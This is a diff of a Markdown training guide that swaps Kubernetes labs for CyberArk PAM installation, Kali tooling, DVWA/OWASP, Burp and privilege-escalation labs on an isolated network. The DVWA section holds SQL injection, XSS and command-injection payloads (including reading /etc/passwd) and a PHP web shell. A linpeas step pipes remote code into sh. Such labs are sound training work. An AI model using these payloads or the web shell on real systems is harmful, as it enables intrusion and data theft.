@@ -1,713 +1,590 @@
-# Hands-On Labs: Phase 1 - PAM + Kubernetes Mastery
+# Hands-On Labs: Phase 1 — PAM Stack + Offensive Security Foundation
 
-Practical lab exercises with actual commands for Months 1-11. These labs complement the theoretical knowledge from certification guides.
-
-**Prerequisites**:
-- Linux VM (Ubuntu 22.04+ recommended) with 8GB+ RAM
-- Docker installed
-- kubectl installed
-- Basic terminal proficiency
-
-**Lab Environment**: See [GETTING_STARTED.md](../GETTING_STARTED.md) for initial setup.
+Step-by-step lab exercises for Months 1-6, covering the full CyberArk PAM stack build and Kali Linux offensive security fundamentals.
 
 ---
 
-## Table of Contents
+## Prerequisites
 
-1. [Lab Environment Setup](#lab-environment-setup)
-2. [Kubernetes Cluster Deployment](#kubernetes-cluster-deployment)
-3. [Kubernetes Security Fundamentals](#kubernetes-security-fundamentals)
-4. [CyberArk PAM Lab Setup](#cyberark-pam-lab-setup)
-5. [PAM + Kubernetes Integration](#pam--kubernetes-integration)
-6. [Troubleshooting Commands](#troubleshooting-commands)
+- Host machine: 16 GB RAM minimum (32 GB recommended), 250 GB free disk space
+- Hypervisor: VirtualBox 7.x or VMware Workstation Pro / Player (free)
+- Download links:
+  - Windows Server 2022 Evaluation (180-day): https://www.microsoft.com/en-us/evalcenter/evaluate-windows-server-2022
+  - Kali Linux 2026.x ISO: https://www.kali.org/get-kali/
+  - CyberArk trial media: request from CyberArk Campus at https://www.cyberark.com/cyberark-campus/
+- All lab VMs run on an isolated NAT or host-only network — no internet exposure
 
 ---
 
-## Lab Environment Setup
+## Lab 1: Lab Network Architecture
 
-### Month 1, Week 1: Infrastructure Foundation
+**Month 1, Week 1**
 
-#### Install Docker
+### Target Lab Topology
+
+| VM | OS | RAM | Disk | Static IP |
+|----|-----|-----|------|-----------|
+| VAULT01 | Windows Server 2022 | 4 GB | 60 GB | 192.168.100.10 |
+| CPM01 | Windows Server 2022 | 4 GB | 40 GB | 192.168.100.20 |
+| PVWA01 | Windows Server 2022 | 4 GB | 40 GB | 192.168.100.30 |
+| PSM01 | Windows Server 2022 | 4 GB | 40 GB | 192.168.100.40 |
+| DC01 | Windows Server 2022 | 4 GB | 40 GB | 192.168.100.5 (add Month 2) |
+| kali | Kali Linux 2026.x | 4 GB | 80 GB | 192.168.100.100 |
+| target01 (optional) | Ubuntu (Metasploitable2 or DVWA) | 1 GB | 20 GB | 192.168.100.50 |
+
+All VMs share the same isolated /24 network (192.168.100.0/24). Kali acts as the attack host on the same segment.
+
+### Create the VirtualBox Host-Only Network
 
 ```bash
-# Update system packages
-sudo apt update && sudo apt upgrade -y
-
-# Install prerequisites
-sudo apt install -y apt-transport-https ca-certificates curl software-properties-common gnupg lsb-release
-
-# Add Docker GPG key
-curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo gpg --dearmor -o /usr/share/keyrings/docker-archive-keyring.gpg
-
-# Add Docker repository
-echo "deb [arch=$(dpkg --print-architecture) signed-by=/usr/share/keyrings/docker-archive-keyring.gpg] https://download.docker.com/linux/ubuntu $(lsb_release -cs) stable" | sudo tee /etc/apt/sources.list.d/docker.list > /dev/null
-
-# Install Docker
-sudo apt update
-sudo apt install -y docker-ce docker-ce-cli containerd.io docker-compose-plugin
-
-# Add user to docker group (logout/login required)
-sudo usermod -aG docker $USER
-
-# Verify installation
-docker --version
-docker run hello-world
+VBoxManage hostonlyif create
+VBoxManage hostonlyif ipconfig vboxnet0 --ip 192.168.100.1 --netmask 255.255.255.0
 ```
 
-#### Install kubectl
+### Set Static IPs on Windows VMs (PowerShell)
 
-```bash
-# Download kubectl binary
-curl -LO "https://dl.k8s.io/release/$(curl -L -s https://dl.k8s.io/release/stable.txt)/bin/linux/amd64/kubectl"
+Run the following on each Windows VM, substituting the correct IP address for each server:
 
-# Verify checksum (optional but recommended)
-curl -LO "https://dl.k8s.io/release/$(curl -L -s https://dl.k8s.io/release/stable.txt)/bin/linux/amd64/kubectl.sha256"
-echo "$(cat kubectl.sha256)  kubectl" | sha256sum --check
-
-# Install kubectl
-sudo install -o root -g root -m 0755 kubectl /usr/local/bin/kubectl
-
-# Verify installation
-kubectl version --client
+```powershell
+New-NetIPAddress -InterfaceAlias "Ethernet" -IPAddress 192.168.100.10 -PrefixLength 24 -DefaultGateway 192.168.100.1
+Set-DnsClientServerAddress -InterfaceAlias "Ethernet" -ServerAddresses 192.168.100.5
 ```
 
-#### Install Helm
+Rename each computer to match the topology before rebooting:
 
-```bash
-# Download Helm installer
-curl -fsSL -o get_helm.sh https://raw.githubusercontent.com/helm/helm/main/scripts/get-helm-3
-
-# Install Helm
-chmod 700 get_helm.sh
-./get_helm.sh
-
-# Verify installation
-helm version
+```powershell
+Rename-Computer -NewName "VAULT01" -Restart
 ```
 
 ---
 
-## Kubernetes Cluster Deployment
+## Lab 2: CyberArk Vault Installation
 
-### Option A: Minikube (Single-Node Development)
+**Month 1, Week 2**
 
-```bash
-# Install minikube
-curl -LO https://storage.googleapis.com/minikube/releases/latest/minikube-linux-amd64
-sudo install minikube-linux-amd64 /usr/local/bin/minikube
+Assume CyberArk media has been extracted to `C:\CyberArk\Vault` on VAULT01.
 
-# Start cluster with specific resources
-minikube start --cpus=4 --memory=8192 --driver=docker
+### Pre-Installation Checklist
 
-# Verify cluster status
-minikube status
-kubectl cluster-info
-kubectl get nodes
+- Disable Windows Firewall temporarily (re-enable after install with correct rules)
+- Confirm static IP is set and hostname is VAULT01
+- Ensure at least 40 GB free on the system drive
+
+```powershell
+# Confirm static IP
+Get-NetIPAddress -InterfaceAlias "Ethernet"
+
+# Confirm hostname
+hostname
+
+# Temporarily disable Windows Firewall
+Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False
 ```
 
-### Option B: kind (Kubernetes in Docker - Multi-Node)
+### Run the Vault Installer
 
-```bash
-# Install kind
-curl -Lo ./kind https://kind.sigs.k8s.io/dl/v0.24.0/kind-linux-amd64
-chmod +x ./kind
-sudo mv ./kind /usr/local/bin/kind
+Launch `setup.exe` from `C:\CyberArk\Vault\` as a local administrator. Follow the wizard:
 
-# Create multi-node cluster configuration
-cat <<EOF > kind-config.yaml
-kind: Cluster
-apiVersion: kind.x-k8s.io/v1alpha4
-nodes:
-- role: control-plane
-  kubeadmConfigPatches:
-  - |
-    kind: InitConfiguration
-    nodeRegistration:
-      kubeletExtraArgs:
-        node-labels: "ingress-ready=true"
-  extraPortMappings:
-  - containerPort: 80
-    hostPort: 80
-    protocol: TCP
-  - containerPort: 443
-    hostPort: 443
-    protocol: TCP
-- role: worker
-- role: worker
-EOF
+1. Accept the license agreement.
+2. Set the Vault installation path (default: `C:\Program Files (x86)\PrivateArk\`).
+3. Enter the Vault administrator password — store this in a safe location.
+4. Accept default port 1858 unless it conflicts.
+5. Complete the installation and allow the first boot to finish.
 
-# Create cluster
-kind create cluster --config kind-config.yaml --name pam-lab
+### Post-Install Verification
 
-# Verify cluster
-kubectl get nodes
-kubectl get pods -A
+```powershell
+# Confirm Vault service is running
+Get-Service -Name "CyberArk Vault" | Select-Object Status
+
+# Confirm Vault is listening on port 1858
+Test-NetConnection -ComputerName localhost -Port 1858
+
+# Check recent Vault events in the Application log
+Get-EventLog -LogName Application -Source "CyberArk*" -Newest 10
 ```
 
-### Option C: k3s (Lightweight Production-Grade)
+### CredFile Creation
+
+Use the `CreateCredFile.exe` utility (found in Vault media tools) to generate CredFiles for CPM and PVWA service accounts. These are required for each component to authenticate to the Vault at startup.
+
+### Vault Hardening Checklist
+
+- Disable unnecessary Windows services (Print Spooler, Remote Registry, Bluetooth support)
+- Enable audit logging (Object Access, Logon/Logoff, Policy Change) via Group Policy or Local Security Policy
+- Configure a backup schedule to a separate volume or network share
+- Re-enable Windows Firewall and add an inbound rule for TCP 1858 from CPM01 and PVWA01 only
+
+---
+
+## Lab 3: CPM Installation and First Account Onboarding
+
+**Month 1, Week 3**
+
+### CPM Prerequisites
+
+- VAULT01 must be running and reachable on TCP 1858
+- A CredFile for the CPM service account must exist (generated during Vault setup)
+- The CPM service account (e.g., `PasswordManager`) must be defined in the Vault
+
+### Test Connectivity Before Installation
+
+```powershell
+Test-NetConnection -ComputerName 192.168.100.10 -Port 1858
+```
+
+### Run the CPM Installer
+
+Extract CyberArk CPM media to `C:\CyberArk\CPM\` on CPM01. Launch `setup.exe` as local administrator. When prompted, supply the Vault address (192.168.100.10) and the path to the CPM CredFile.
+
+### Post-Install Verification
+
+```powershell
+# Confirm CPM service is running and set to automatic
+Get-Service -Name "CyberArk Password Manager" | Select-Object Status, StartType
+
+# Tail CPM logs to verify it connected to Vault
+Get-Content "C:\Program Files (x86)\CyberArk\Password Manager\Logs\pm.log" -Tail 20
+```
+
+### First Platform Onboarding — Windows Local Accounts
+
+1. Log in to the PVWA (https://192.168.100.30/PasswordVault/).
+2. Navigate to Administration → Platform Management.
+3. Duplicate the built-in `WinLocalAccounts` platform and name it `LabWinLocal`.
+4. Set the following intervals:
+   - Verification: every 1 day
+   - Change: every 30 days
+   - Reconcile: on failure
+5. Save the platform.
+
+### Onboard the First Test Account
+
+- Target: the local Administrator account on CPM01 (192.168.100.20)
+- Safe: create a new safe named `LAB-Windows-Local`
+- Add CPM01 as the "address" and confirm CPM can verify the password
+
+---
+
+## Lab 4: PVWA Installation and IIS Configuration
+
+**Month 1, Week 4**
+
+### Install IIS and ASP.NET Prerequisites
+
+```powershell
+Install-WindowsFeature -Name Web-Server, Web-Asp-Net45, Web-Windows-Auth -IncludeManagementTools
+```
+
+Verify IIS is running before proceeding:
+
+```powershell
+Get-Service -Name W3SVC | Select-Object Status
+```
+
+### Run the PVWA Installer
+
+Extract PVWA media to `C:\CyberArk\PVWA\` on PVWA01. Launch `setup.exe` as local administrator. Supply the Vault address and the PVWA CredFile path when prompted. The installer configures IIS automatically.
+
+### Post-Install Configuration
+
+After installation, open `C:\CyberArk\Password Vault Web Access\` and verify `web.config` contains the correct Vault IP address. Restart the IIS application pool if you change this file:
+
+```powershell
+Restart-WebAppPool -Name "PVWA"
+```
+
+### Authentication Methods
+
+The PVWA supports three authentication methods configured in the Vault:
+
+- `CyberArk` — native Vault credentials (default for lab)
+- `LDAP` — Active Directory (configure after DC01 is joined in Month 2)
+- `RADIUS` — for MFA integrations (configure in Month 3)
+
+### Post-Install Validation from Kali
 
 ```bash
-# Install k3s (single command)
-curl -sfL https://get.k3s.io | sh -
+# Confirm PVWA web interface responds
+curl -k -I https://192.168.100.30/PasswordVault/
 
-# Copy kubeconfig
-mkdir -p ~/.kube
-sudo cp /etc/rancher/k3s/k3s.yaml ~/.kube/config
-sudo chown $USER:$USER ~/.kube/config
-
-# Verify cluster
-kubectl get nodes
+# Port and service scan on PVWA
+nmap -sV -p 443 192.168.100.30
 ```
 
 ---
 
-## Kubernetes Security Fundamentals
+## Lab 5: PSM Installation and Session Recording
 
-### Lab 3.1: RBAC (Role-Based Access Control)
+**Month 2, Weeks 5-6**
 
-```bash
-# Create namespace for RBAC testing
-kubectl create namespace rbac-demo
+### PSM Prerequisites
 
-# Create a ServiceAccount
-kubectl create serviceaccount demo-sa -n rbac-demo
+- VAULT01 must be running; TCP 1858 must be reachable from PSM01
+- A PSM CredFile and PSM service account must exist in the Vault
+- RDP (TCP 3389) must be open inbound on PSM01
 
-# Create a Role with limited permissions
-cat <<EOF | kubectl apply -f -
-apiVersion: rbac.authorization.k8s.io/v1
-kind: Role
-metadata:
-  namespace: rbac-demo
-  name: pod-reader
-rules:
-- apiGroups: [""]
-  resources: ["pods"]
-  verbs: ["get", "watch", "list"]
-- apiGroups: [""]
-  resources: ["pods/log"]
-  verbs: ["get"]
-EOF
+### Run the PSM Installer
 
-# Create RoleBinding
-cat <<EOF | kubectl apply -f -
-apiVersion: rbac.authorization.k8s.io/v1
-kind: RoleBinding
-metadata:
-  name: read-pods
-  namespace: rbac-demo
-subjects:
-- kind: ServiceAccount
-  name: demo-sa
-  namespace: rbac-demo
-roleRef:
-  kind: Role
-  name: pod-reader
-  apiGroup: rbac.authorization.k8s.io
-EOF
+Extract PSM media to `C:\CyberArk\PSM\` on PSM01. Launch `setup.exe` and supply the Vault address and CredFile. The installer configures the RDS role and PSM connectors automatically.
 
-# Verify RBAC setup
-kubectl auth can-i list pods --as=system:serviceaccount:rbac-demo:demo-sa -n rbac-demo
-kubectl auth can-i delete pods --as=system:serviceaccount:rbac-demo:demo-sa -n rbac-demo
+### Post-Install Verification
+
+```powershell
+# Confirm PSM service is running
+Get-Service -Name "CyberArk Privileged Session Manager" | Select-Object Status
+
+# Confirm RDP listener is active
+Test-NetConnection -ComputerName localhost -Port 3389
 ```
 
-### Lab 3.2: Network Policies
+### Session Recording Safe Configuration
+
+1. Log in to PVWA as an administrator.
+2. Navigate to Administration → System Configuration → Options.
+3. Under PSM, confirm the recording safe is set to `PSMRecordings`.
+4. In PrivateArk Client, open the `PSMRecordings` safe and verify it exists.
+
+### Universal Connector Basics
+
+The PSM ships with connectors for RDP and SSH out of the box. To connect through PSM to a target:
+
+1. Open PVWA and find a managed account.
+2. Click Connect → choose the PSM01 connector.
+3. PVWA launches a brokered RDP session via PSM01 to the target.
+
+### Review a Recorded Session
+
+1. In PVWA, navigate to Monitoring → Recordings.
+2. Locate the session just recorded.
+3. Click Play to open the session in the built-in viewer.
+4. Note the timeline, keystrokes, and commands captured.
+
+---
+
+## Lab 6: Kali Linux Setup and Tooling Baseline
+
+**Month 1-2 (parallel with PAM labs)**
+
+### System Update and Tool Installation
 
 ```bash
-# Create namespace with network policies
-kubectl create namespace netpol-demo
+# Initial Kali update
+sudo apt update && sudo apt full-upgrade -y
 
-# Deploy test pods
-kubectl run frontend --image=nginx --labels="app=frontend" -n netpol-demo
-kubectl run backend --image=nginx --labels="app=backend" -n netpol-demo
-kubectl run database --image=nginx --labels="app=database" -n netpol-demo
+# Install additional tools
+sudo apt install -y seclists gobuster feroxbuster crackmapexec bloodhound neo4j \
+    impacket-scripts netexec evil-winrm chisel proxychains4 \
+    responder enum4linux-ng ldap-utils
 
-# Wait for pods to be ready
-kubectl wait --for=condition=Ready pods --all -n netpol-demo --timeout=60s
+# Verify Metasploit
+msfconsole --version
 
-# Create default deny all ingress policy
-cat <<EOF | kubectl apply -f -
-apiVersion: networking.k8s.io/v1
-kind: NetworkPolicy
-metadata:
-  name: default-deny-ingress
-  namespace: netpol-demo
-spec:
-  podSelector: {}
-  policyTypes:
-  - Ingress
-EOF
+# Initialize Metasploit database
+sudo msfdb init
+msfconsole -q -x "db_status; exit"
 
-# Allow frontend to access backend only
-cat <<EOF | kubectl apply -f -
-apiVersion: networking.k8s.io/v1
-kind: NetworkPolicy
-metadata:
-  name: allow-frontend-to-backend
-  namespace: netpol-demo
-spec:
-  podSelector:
-    matchLabels:
-      app: backend
-  policyTypes:
-  - Ingress
-  ingress:
-  - from:
-    - podSelector:
-        matchLabels:
-          app: frontend
-    ports:
-    - protocol: TCP
-      port: 80
-EOF
+# Verify Burp Suite Community
+burpsuite &
 
-# Allow backend to access database only
-cat <<EOF | kubectl apply -f -
-apiVersion: networking.k8s.io/v1
-kind: NetworkPolicy
-metadata:
-  name: allow-backend-to-database
-  namespace: netpol-demo
-spec:
-  podSelector:
-    matchLabels:
-      app: database
-  policyTypes:
-  - Ingress
-  ingress:
-  - from:
-    - podSelector:
-        matchLabels:
-          app: backend
-    ports:
-    - protocol: TCP
-      port: 80
-EOF
-
-# Verify network policies
-kubectl get networkpolicies -n netpol-demo
-kubectl describe networkpolicy allow-frontend-to-backend -n netpol-demo
+# Create lab working directory structure
+mkdir -p ~/lab/{scans,loot,exploits,reports}
 ```
 
-### Lab 3.3: Pod Security Standards
+### Nmap Baseline Scans Against the PAM Lab Network
 
 ```bash
-# Create namespace with Pod Security Standards enforced
-kubectl create namespace pss-demo
+# Host discovery
+nmap -sn 192.168.100.0/24 -oA ~/lab/scans/host_discovery
 
-# Label namespace with restricted security level
-kubectl label namespace pss-demo \
-  pod-security.kubernetes.io/enforce=restricted \
-  pod-security.kubernetes.io/audit=restricted \
-  pod-security.kubernetes.io/warn=restricted
+# Full service scan on the Vault server
+nmap -sV -sC --open -p- --min-rate 2000 192.168.100.10 -oA ~/lab/scans/vault_full
 
-# Try to create a privileged pod (should fail)
-cat <<EOF | kubectl apply -f -
-apiVersion: v1
-kind: Pod
-metadata:
-  name: privileged-pod
-  namespace: pss-demo
-spec:
-  containers:
-  - name: nginx
-    image: nginx
-    securityContext:
-      privileged: true
-EOF
-# Expected: Error - violates PodSecurity "restricted"
-
-# Create compliant pod
-cat <<EOF | kubectl apply -f -
-apiVersion: v1
-kind: Pod
-metadata:
-  name: secure-pod
-  namespace: pss-demo
-spec:
-  securityContext:
-    runAsNonRoot: true
-    runAsUser: 1000
-    seccompProfile:
-      type: RuntimeDefault
-  containers:
-  - name: nginx
-    image: nginx
-    securityContext:
-      allowPrivilegeEscalation: false
-      capabilities:
-        drop:
-        - ALL
-      readOnlyRootFilesystem: true
-    volumeMounts:
-    - name: tmp
-      mountPath: /tmp
-    - name: cache
-      mountPath: /var/cache/nginx
-    - name: run
-      mountPath: /var/run
-  volumes:
-  - name: tmp
-    emptyDir: {}
-  - name: cache
-    emptyDir: {}
-  - name: run
-    emptyDir: {}
-EOF
-
-# Verify pod status
-kubectl get pods -n pss-demo
+# UDP top ports on the Vault server
+sudo nmap -sU --top-ports 100 192.168.100.10 -oA ~/lab/scans/vault_udp
 ```
 
-### Lab 3.4: Secrets Management
+Repeat the service and UDP scans for 192.168.100.20 (CPM01), .30 (PVWA01), and .40 (PSM01). Save all output in `~/lab/scans/` using consistent naming (`cpm_full`, `pvwa_full`, `psm_full`).
+
+---
+
+## Lab 7: DVWA Setup and OWASP Top 10 Labs
+
+**Month 3**
+
+### Install DVWA
 
 ```bash
-# Create namespace for secrets demo
-kubectl create namespace secrets-demo
+# Run DVWA via Docker (simplest method on Kali)
+docker run -d -p 8080:80 vulnerables/web-dvwa
 
-# Create a secret from literal values
-kubectl create secret generic db-credentials \
-  --from-literal=username=admin \
-  --from-literal=password='S3cur3P@ss!' \
-  -n secrets-demo
+# Or install via apt
+sudo apt install dvwa
+sudo dvwa-start
 
-# Create secret from file
-echo -n 'my-api-key-12345' > ./api-key.txt
-kubectl create secret generic api-secret \
-  --from-file=api-key=./api-key.txt \
-  -n secrets-demo
-rm ./api-key.txt
+# Verify DVWA is responding
+curl -s http://localhost:8080 | grep -i dvwa
+```
 
-# View secret (base64 encoded)
-kubectl get secret db-credentials -n secrets-demo -o yaml
+Log in with default credentials (`admin` / `password`), navigate to DVWA Security, and set the level to **Low** for initial exercises.
 
-# Decode secret value
-kubectl get secret db-credentials -n secrets-demo -o jsonpath='{.data.password}' | base64 -d
+### OWASP Top 10 Exercise Structure
 
-# Use secret in pod as environment variable
-cat <<EOF | kubectl apply -f -
-apiVersion: v1
-kind: Pod
-metadata:
-  name: secret-env-pod
-  namespace: secrets-demo
-spec:
-  containers:
-  - name: app
-    image: busybox
-    command: ["sh", "-c", "echo DB_USER=\$DB_USERNAME && sleep 3600"]
-    env:
-    - name: DB_USERNAME
-      valueFrom:
-        secretKeyRef:
-          name: db-credentials
-          key: username
-    - name: DB_PASSWORD
-      valueFrom:
-        secretKeyRef:
-          name: db-credentials
-          key: password
-EOF
+Work through each vulnerability with DVWA Security set to Low first, then repeat at Medium.
 
-# Use secret as volume mount
-cat <<EOF | kubectl apply -f -
-apiVersion: v1
-kind: Pod
-metadata:
-  name: secret-volume-pod
-  namespace: secrets-demo
-spec:
-  containers:
-  - name: app
-    image: busybox
-    command: ["sh", "-c", "cat /etc/secrets/username && sleep 3600"]
-    volumeMounts:
-    - name: secret-volume
-      mountPath: /etc/secrets
-      readOnly: true
-  volumes:
-  - name: secret-volume
-    secret:
-      secretName: db-credentials
-EOF
+#### 1. SQL Injection
 
-# Verify secrets are mounted
-kubectl exec -it secret-volume-pod -n secrets-demo -- cat /etc/secrets/username
+Test manually in the input field:
+
+```text
+' OR '1'='1
+```
+
+Then automate with sqlmap:
+
+```bash
+sqlmap -u "http://localhost:8080/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" \
+    --cookie="PHPSESSID=<your_session>;security=low" --dbs --batch
+```
+
+#### 2. XSS Reflected
+
+In the XSS (Reflected) module, enter:
+
+```text
+<script>alert('xss')</script>
+```
+
+Observe the script executing in the browser response.
+
+#### 3. Command Injection
+
+In the Command Injection module, append shell commands to the ping input:
+
+```text
+; id
+| whoami
+&& cat /etc/passwd
+```
+
+#### 4. File Upload
+
+Upload a simple PHP web shell as a `.php` file:
+
+```text
+<?php system($_GET['cmd']); ?>
+```
+
+Navigate to the uploaded file path and trigger it with `?cmd=id`.
+
+#### 5. CSRF
+
+Review the DVWA CSRF module. Craft an HTML form that submits a password-change request without user interaction. Observe that the DVWA application accepts the forged request when the victim is already authenticated.
+
+---
+
+## Lab 8: Burp Suite Proxy Configuration
+
+**Month 3**
+
+### Configure the Browser Proxy
+
+```bash
+# Configure Firefox in Kali to use Burp proxy:
+# Firefox → Settings → Network Settings → Manual proxy configuration
+# HTTP Proxy: 127.0.0.1   Port: 8080
+# Check "Also use this proxy for HTTPS"
+
+# Recommended: install FoxyProxy Standard extension for easy toggling
+# https://addons.mozilla.org/en-US/firefox/addon/foxyproxy-standard/
+
+# Import the Burp CA certificate to avoid TLS warnings
+curl http://burp/cert -o burp_ca.der
+# Firefox → Settings → Privacy & Security → Certificates → Import → select burp_ca.der
+```
+
+### Exercise 1: Intercept a Login Request
+
+1. Enable the Burp proxy in FoxyProxy.
+2. Navigate to the DVWA login page (http://localhost:8080/dvwa/login.php).
+3. Enter any credentials and click Login.
+4. In Burp Proxy → Intercept, observe the captured POST request with `username` and `password` parameters.
+5. Modify the `username` parameter value and forward the request. Observe the changed behavior.
+
+### Exercise 2: Manual SQL Injection with Repeater
+
+1. Capture a request to the DVWA SQL Injection page.
+2. Send it to Repeater (Ctrl+R).
+3. Modify the `id` parameter with payloads such as `1'`, `1 OR 1=1--`, and `1 UNION SELECT null,null--`.
+4. Observe server responses for each payload without needing to re-browse.
+
+### Exercise 3: Login Brute-Force with Intruder
+
+1. Capture the DVWA login POST request.
+2. Send to Intruder (Ctrl+I).
+3. Set attack type to **Sniper**.
+4. Mark the `password` parameter value as the payload position.
+5. Load a short wordlist from `/usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-100.txt`.
+6. Start the attack and filter by response length to identify the successful password.
+
+---
+
+## Lab 9: Linux Privilege Escalation Basics
+
+**Month 4**
+
+### Set Up a Vulnerable Linux Target
+
+Deploy Metasploitable2 as a VM on the lab network at 192.168.100.50. Alternatively, use any intentionally vulnerable Linux VM.
+
+### Enumerate the Target from Kali
+
+```bash
+# Initial service scan
+nmap -sV -sC 192.168.100.50 -oA ~/lab/scans/metasploitable
+
+# Find SUID binaries on a Linux host (run from a shell on the target)
+find /usr/bin /usr/sbin /bin /sbin -perm -4000 2>/dev/null
+
+# Check sudo permissions
+sudo -l
+
+# Review cron jobs
+cat /etc/crontab
+ls -la /etc/cron.*
+
+# Check for writable directories in PATH
+echo $PATH | tr ':' '\n' | xargs -I{} ls -ld {}
+
+# Run linpeas for automated enumeration
+curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh
+```
+
+### GTFOBins Reference
+
+For every SUID binary found, look it up at https://gtfobins.github.io to check whether it can be exploited for privilege escalation. Document each finding with:
+
+- Binary name
+- SUID present (yes/no)
+- GTFOBins entry URL
+- Exploitation method (if applicable)
+
+---
+
+## Lab 10: DevSecOps Security Pipeline
+
+**Month 5**
+
+### Install Security Scanning Tools
+
+```bash
+# Install Semgrep
+pip3 install semgrep
+semgrep --version
+
+# Install gitleaks
+wget https://github.com/gitleaks/gitleaks/releases/latest/download/gitleaks_linux_x64.tar.gz
+tar xzf gitleaks_linux_x64.tar.gz -C /usr/local/bin/
+
+# Install Trivy
+wget -qO - https://aquasecurity.github.io/trivy-repo/deb/public.key | sudo apt-key add -
+echo "deb https://aquasecurity.github.io/trivy-repo/deb $(lsb_release -sc) main" | sudo tee /etc/apt/sources.list.d/trivy.list
+sudo apt update && sudo apt install trivy -y
+```
+
+### Run Tools Manually Against a Sample Repository
+
+```bash
+# SAST scan with Semgrep
+semgrep --config=auto /path/to/your/repo --error
+
+# Secret scan with gitleaks
+gitleaks detect --source /path/to/your/repo --verbose
+
+# Container image scan with Trivy
+trivy image ubuntu:22.04
+```
+
+### GitHub Actions Workflow Example
+
+Create `.github/workflows/security.yml` in any portfolio project repository:
+
+```yaml
+name: Security Scan
+on: [push, pull_request]
+jobs:
+  security:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          fetch-depth: 0
+      - name: Semgrep SAST
+        run: |
+          pip install semgrep
+          semgrep --config=auto . --error
+      - name: Gitleaks secret scan
+        uses: gitleaks/gitleaks-action@v2
+      - name: Trivy container scan
+        uses: aquasecurity/trivy-action@master
+        with:
+          image-ref: 'your-image:latest'
+          format: 'table'
+          exit-code: '1'
+          severity: 'CRITICAL,HIGH'
+```
+
+Push a commit to the repository and verify all three jobs appear in the Actions tab. Review the output for any findings.
+
+---
+
+## Troubleshooting
+
+### Vault Service Will Not Start
+
+- Verify the CredFile path in `Vault.ini` is correct and the file is readable by the service account
+- Check that no other process is using TCP 1858 (`netstat -ano | findstr 1858`)
+- Confirm Windows Server time is synchronized (Kerberos is time-sensitive)
+- Review the Application event log for `CyberArk` source entries
+
+### CPM Cannot Connect to Vault
+
+```powershell
+# Verify TCP 1858 is reachable from CPM01
+Test-NetConnection -ComputerName 192.168.100.10 -Port 1858
+
+# Re-verify CredFile path in CPM configuration
+Get-Content "C:\Program Files (x86)\CyberArk\Password Manager\Vault\Vault.ini"
+```
+
+### PVWA Shows a White Screen or 500 Error
+
+- Check the IIS application pool identity has read access to the PVWA directory
+- Open `web.config` and confirm the Vault address is set to 192.168.100.10
+- Restart the PVWA application pool: `Restart-WebAppPool -Name "PVWA"`
+- Review `C:\CyberArk\Password Vault Web Access\Logs\` for error details
+
+### PSM Session Fails to Launch
+
+- Confirm RDP (TCP 3389) is open on the PSM01 firewall
+- Verify the target machine's RDP port is reachable from PSM01
+- Check PSM connector logs at `C:\Program Files (x86)\CyberArk\PSM\Logs\`
+- Confirm the PSM service account has the required Vault permissions
+
+### Kali Tool Not Found
+
+```bash
+# Check if tool is installed
+which <tool-name>
+
+# Re-install the tool
+sudo apt install <tool-name>
+
+# If installed but not in PATH, locate the binary
+sudo find /usr -name "<tool-name>" 2>/dev/null
 ```
 
 ---
 
-## CyberArk PAM Lab Setup
-
-### Lab 4.1: CyberArk Container Deployment (Development Only)
-
-> **Note**: For production CyberArk deployments, follow official CyberArk documentation. This is for learning purposes only.
-
-```bash
-# Create namespace for PAM components
-kubectl create namespace cyberark-pam
-
-# Create persistent storage for Vault
-cat <<EOF | kubectl apply -f -
-apiVersion: v1
-kind: PersistentVolumeClaim
-metadata:
-  name: vault-data
-  namespace: cyberark-pam
-spec:
-  accessModes:
-    - ReadWriteOnce
-  resources:
-    requests:
-      storage: 10Gi
-EOF
-
-# Create ConfigMap for Vault configuration
-cat <<EOF | kubectl apply -f -
-apiVersion: v1
-kind: ConfigMap
-metadata:
-  name: vault-config
-  namespace: cyberark-pam
-data:
-  vault.ini: |
-    [Main]
-    VaultPort=1858
-    VaultDebugLevel=5
-    VaultLogPath=/var/log/cyberark
-EOF
-```
-
-### Lab 4.2: HashiCorp Vault (Alternative for PAM Concepts)
-
-For learning PAM concepts without CyberArk license:
-
-```bash
-# Deploy HashiCorp Vault for secrets management practice
-helm repo add hashicorp https://helm.releases.hashicorp.com
-helm repo update
-
-# Install Vault in dev mode
-helm install vault hashicorp/vault \
-  --namespace vault \
-  --create-namespace \
-  --set "server.dev.enabled=true" \
-  --set "injector.enabled=true"
-
-# Wait for Vault to be ready
-kubectl wait --for=condition=Ready pods -l app.kubernetes.io/name=vault -n vault --timeout=120s
-
-# Port forward to access Vault UI
-kubectl port-forward svc/vault 8200:8200 -n vault &
-
-# Initialize Vault (if not in dev mode)
-# kubectl exec -it vault-0 -n vault -- vault operator init
-
-# Access Vault (dev mode root token is "root")
-export VAULT_ADDR='http://127.0.0.1:8200'
-export VAULT_TOKEN='root'
-
-# Enable KV secrets engine
-kubectl exec -it vault-0 -n vault -- vault secrets enable -path=secret kv-v2
-
-# Create a secret
-kubectl exec -it vault-0 -n vault -- vault kv put secret/myapp/config \
-  username="appuser" \
-  password="s3cr3t"
-
-# Read secret
-kubectl exec -it vault-0 -n vault -- vault kv get secret/myapp/config
-```
-
----
-
-## PAM + Kubernetes Integration
-
-### Lab 5.1: Service Account Token Management
-
-```bash
-# Create namespace for integration testing
-kubectl create namespace pam-integration
-
-# Create ServiceAccount with limited token lifetime
-cat <<EOF | kubectl apply -f -
-apiVersion: v1
-kind: ServiceAccount
-metadata:
-  name: app-service-account
-  namespace: pam-integration
----
-apiVersion: v1
-kind: Secret
-metadata:
-  name: app-service-account-token
-  namespace: pam-integration
-  annotations:
-    kubernetes.io/service-account.name: app-service-account
-type: kubernetes.io/service-account-token
-EOF
-
-# Create pod using ServiceAccount
-cat <<EOF | kubectl apply -f -
-apiVersion: v1
-kind: Pod
-metadata:
-  name: app-pod
-  namespace: pam-integration
-spec:
-  serviceAccountName: app-service-account
-  automountServiceAccountToken: true
-  containers:
-  - name: app
-    image: curlimages/curl
-    command: ["sh", "-c", "sleep 3600"]
-EOF
-
-# Verify token is mounted
-kubectl exec -it app-pod -n pam-integration -- cat /var/run/secrets/kubernetes.io/serviceaccount/token
-```
-
-### Lab 5.2: External Secrets Operator (Production Pattern)
-
-```bash
-# Install External Secrets Operator
